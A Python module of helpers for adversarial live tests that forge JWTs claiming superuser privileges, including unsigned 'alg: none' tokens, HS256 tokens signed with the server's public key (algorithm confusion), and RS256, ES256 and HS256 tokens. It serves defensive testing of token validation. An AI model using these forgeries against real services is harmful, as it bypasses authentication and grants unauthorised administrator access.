"""Token-crafting helpers for adversarial live tests."""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import uuid
from datetime import UTC, datetime, timedelta
from typing import Literal

import jwt

_FALLBACK_KID = "unknown"
DEFAULT_ACCESS_CLAIM_TYPE = "access"

CANONICAL_SUPERUSER_ROLE = "superadmin"
DEFAULT_ROLE = "user"


def b64url_nopad(data: bytes) -> str:
    """Base64url-encode without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def canonical_role_for(is_superuser: bool) -> str:
    """Return the role label that canonically pairs with ``is_superuser``."""
    return CANONICAL_SUPERUSER_ROLE if is_superuser else DEFAULT_ROLE


def resolve_claim_pair(
    *,
    is_superuser: bool | None = None,
    role: str | None = None,
    allow_inconsistent_claims: bool = False,
) -> tuple[bool, str]:
    """Derive the ``(is_superuser, role)`` pair together, canonically by default.

    The forged privilege pair must satisfy ``is_superuser <=> role ==
    "superadmin"`` so that a forged token's *only* rejection cause is its
    signature. Supplying one side derives the other; supplying both
    inconsistently raises unless ``allow_inconsistent_claims=True`` explicitly
    opts in (used only by tests that target the claim invariant itself).
    """
    if role is None:
        flag = bool(is_superuser)
        return flag, canonical_role_for(flag)

    role_is_superuser = role.strip().lower() == CANONICAL_SUPERUSER_ROLE
    if is_superuser is None:
        return role_is_superuser, role

    flag = bool(is_superuser)
    if flag != role_is_superuser and not allow_inconsistent_claims:
        raise ValueError(
            f"Inconsistent privilege claims: is_superuser={flag!r} with "
            f"role={role!r}. Pass allow_inconsistent_claims=True to forge the "
            "pair deliberately."
        )
    return flag, role


def escalate_claims(
    claims: dict[str, object], *, is_superuser: bool = True
) -> dict[str, object]:
    """Set the privilege pair on decoded claims, keeping it canonical."""
    flag, role = resolve_claim_pair(is_superuser=is_superuser)
    claims["is_superuser"] = flag
    claims["role"] = role
    return claims


def access_payload(
    *,
    is_superuser: bool | None = None,
    role: str | None = None,
    allow_inconsistent_claims: bool = False,
    is_active: bool = True,
    email: str = "forged@example.invalid",
    token_type: str = DEFAULT_ACCESS_CLAIM_TYPE,
    iss: str | None = None,
    aud: str | None = None,
) -> dict[str, object]:
    """Return a minimal but plausible access token payload.

    ``role`` and ``is_superuser`` are derived together (canonical by default);
    see :func:`resolve_claim_pair` for the explicit inconsistent-pair opt-in.
    """
    superuser_flag, role_claim = resolve_claim_pair(
        is_superuser=is_superuser,
        role=role,
        allow_inconsistent_claims=allow_inconsistent_claims,
    )
    now = int(datetime.now(UTC).timestamp())
    payload: dict[str, object] = {
        "sub": str(uuid.uuid4()),
        "email": email,
        "is_superuser": superuser_flag,
        "is_active": is_active,
        "role": role_claim,
        "full_name": "Live Security Test",
        "exp": now + 3600,
        "iat": now,
        "nbf": now,
        "jti": str(uuid.uuid4()),
        "type": token_type,
    }
    if iss is not None:
        payload["iss"] = iss
    if aud is not None:
        payload["aud"] = aud
    return payload


def _forged_claims(
    *,
    is_superuser: bool | None,
    role: str | None,
    allow_inconsistent_claims: bool,
    token_type: str = DEFAULT_ACCESS_CLAIM_TYPE,
    iss: str | None = None,
    aud: str | None = None,
    payload_kw: dict[str, object],
) -> dict[str, object]:
    """Build forged claims with the privilege pair resolved canonically.

    Escalation forges default to `is_superuser=True` when neither side of the
    pair is given. `payload_kw` carries only non-privilege claim overrides —
    `is_superuser`/`role`/`allow_inconsistent_claims` are named parameters on
    every forge helper, so they cannot bypass :func:`resolve_claim_pair`.
    """
    if is_superuser is None and role is None:
        is_superuser = True

    claims = access_payload(
        is_superuser=is_superuser,
        role=role,
        allow_inconsistent_claims=allow_inconsistent_claims,
        token_type=token_type,
        iss=iss,
        aud=aud,
    )
    claims.update(payload_kw)
    return claims


def forge_alg_none(
    is_superuser: bool | None = None,
    *,
    role: str | None = None,
    allow_inconsistent_claims: bool = False,
    **payload_kw: object,
) -> str:
    """Craft an unsigned JWT claiming canonical superuser privileges."""
    header = b64url_nopad(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    claims = _forged_claims(
        is_superuser=is_superuser,
        role=role,
        allow_inconsistent_claims=allow_inconsistent_claims,
        payload_kw=payload_kw,
    )
    payload = b64url_nopad(json.dumps(claims).encode())
    return f"{header}.{payload}."


def forge_hs256_with_pubkey(
    public_key_pem: str,
    *,
    is_superuser: bool | None = None,
    role: str | None = None,
    allow_inconsistent_claims: bool = False,
    **payload_kw: object,
) -> str:
    """Sign a JWT with a public key as the HS256 secret."""
    header = b64url_nopad(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
    claims = _forged_claims(
        is_superuser=is_superuser,
        role=role,
        allow_inconsistent_claims=allow_inconsistent_claims,
        payload_kw=payload_kw,
    )
    payload = b64url_nopad(json.dumps(claims).encode())
    signing_input = f"{header}.{payload}".encode()
    sig = hmac.new(public_key_pem.encode(), signing_input, hashlib.sha256).digest()
    return f"{header}.{payload}.{b64url_nopad(sig)}"


def forge_rs256(
    key_pem: str,
    *,
    is_superuser: bool | None = None,
    role: str | None = None,
    allow_inconsistent_claims: bool = False,
    token_type: str = DEFAULT_ACCESS_CLAIM_TYPE,
    kid: str = _FALLBACK_KID,
    iss: str | None = None,
    aud: str | None = None,
    **payload_kw: object,
) -> str:
    """Forge a cryptographically valid RS256 token."""
    return jwt.encode(
        _forged_claims(
            is_superuser=is_superuser,
            role=role,
            allow_inconsistent_claims=allow_inconsistent_claims,
            token_type=token_type,
            iss=iss,
            aud=aud,
            payload_kw=payload_kw,
        ),
        key_pem,
        algorithm="RS256",
        headers={"kid": kid},
    )


def forge_es256(
    key_pem: str,
    *,
    is_superuser: bool | None = None,
    role: str | None = None,
    allow_inconsistent_claims: bool = False,
    token_type: str = DEFAULT_ACCESS_CLAIM_TYPE,
    kid: str = _FALLBACK_KID,
    iss: str | None = None,
    aud: str | None = None,
    **payload_kw: object,
) -> str:
    """Forge a cryptographically valid ES256 token."""
    return jwt.encode(
        _forged_claims(
            is_superuser=is_superuser,
            role=role,
            allow_inconsistent_claims=allow_inconsistent_claims,
            token_type=token_type,
            iss=iss,
            aud=aud,
            payload_kw=payload_kw,
        ),
        key_pem,
        algorithm="ES256",
        headers={"kid": kid},
    )


def forge_asymmetric(
    key_pem: str,
    alg: str,
    *,
    is_superuser: bool | None = None,
    role: str | None = None,
    allow_inconsistent_claims: bool = False,
    token_type: str = DEFAULT_ACCESS_CLAIM_TYPE,
    kid: str = _FALLBACK_KID,
    iss: str | None = None,
    aud: str | None = None,
    **payload_kw: object,
) -> str:
    """Dispatch RS256/ES256 forgery based on detected algorithm."""
    if alg.startswith("RS"):
        return forge_rs256(
            key_pem,
            is_superuser=is_superuser,
            role=role,
            allow_inconsistent_claims=allow_inconsistent_claims,
            token_type=token_type,
            kid=kid,
            iss=iss,
            aud=aud,
            **payload_kw,
        )
    if alg.startswith("ES"):
        return forge_es256(
            key_pem,
            is_superuser=is_superuser,
            role=role,
            allow_inconsistent_claims=allow_inconsistent_claims,
            token_type=token_type,
            kid=kid,
            iss=iss,
            aud=aud,
            **payload_kw,
        )
    raise ValueError(f"Unsupported asymmetric algorithm: {alg!r}")


def forge_hs256(secret: str, *, sub: str | None = None) -> str:
    """Forge an HS256 refresh token signed with the given secret."""
    payload = {
        "sub": sub or str(uuid.uuid4()),
        "exp": int((datetime.now(UTC) + timedelta(hours=24)).timestamp()),
        "jti": str(uuid.uuid4()),
        "type": "refresh",
    }
    return jwt.encode(payload, secret, algorithm="HS256")


Algorithm = Literal["RS256", "ES256", "HS256"]
